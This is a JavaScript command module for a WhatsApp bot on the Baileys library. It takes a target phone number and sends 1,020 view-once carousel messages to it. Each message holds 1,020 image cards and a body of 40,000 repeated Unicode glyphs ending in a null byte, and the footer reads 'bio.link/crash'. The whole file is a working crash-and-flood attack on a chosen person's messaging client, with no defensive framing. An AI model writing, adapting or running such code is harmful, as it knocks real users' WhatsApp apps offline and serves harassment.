const { WAProto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
module.exports = {
    name: "carousel",
    category: "unknown",
    permissions: {
        owner: true
    },
    code: async (ctx) => {
        let args = ctx.args[0]
	    let targeted = args + '@s.whatsapp.net'

        for (let i = 0; i < 1020; i++) {
            console.log('Fkod: ' + i + ' * 1020')
            try {
                let push = [];
                for (let i = 0; i < 1020; i++) {
                    push.push({
                        body: WAProto.Message.InteractiveMessage.Body.fromObject({ text: "ㅤ" }),
                        footer: WAProto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤㅤ" }),
                        header: WAProto.Message.InteractiveMessage.Header.fromObject({
                            title: '*whoami*',
                            hasMediaAttachment: true,
                            imageMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
                                fileLength: "10840",
                                height: 10,
                                width: 10,
                                mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
                                fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
                                directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1721344123",
                                jpegThumbnail: ""
                            }
                        }),
                        nativeFlowMessage: WAProto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
                    });
                }

                const carousel = generateWAMessageFromContent(targeted, {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            interactiveMessage: WAProto.Message.InteractiveMessage.fromObject({
                                body: WAProto.Message.InteractiveMessage.Body.create({ text: `${"𑜦".repeat(40000)}ExtorditcvExtorditcvExtorditcvExtorditcv\n\u0000` }),
                                footer: WAProto.Message.InteractiveMessage.Footer.create({ text: "About Me: bio.link/crash" }),
                                header: WAProto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                                carouselMessage: WAProto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: push })
                            })
                        }
                    }
                }, {});

                await ctx.core.relayMessage(targeted, carousel.message, {
                    participant: { jid: targeted }
                });

            } catch (err) {
                console.error("Error in Fkod:", err);
            }
        }

    }
};
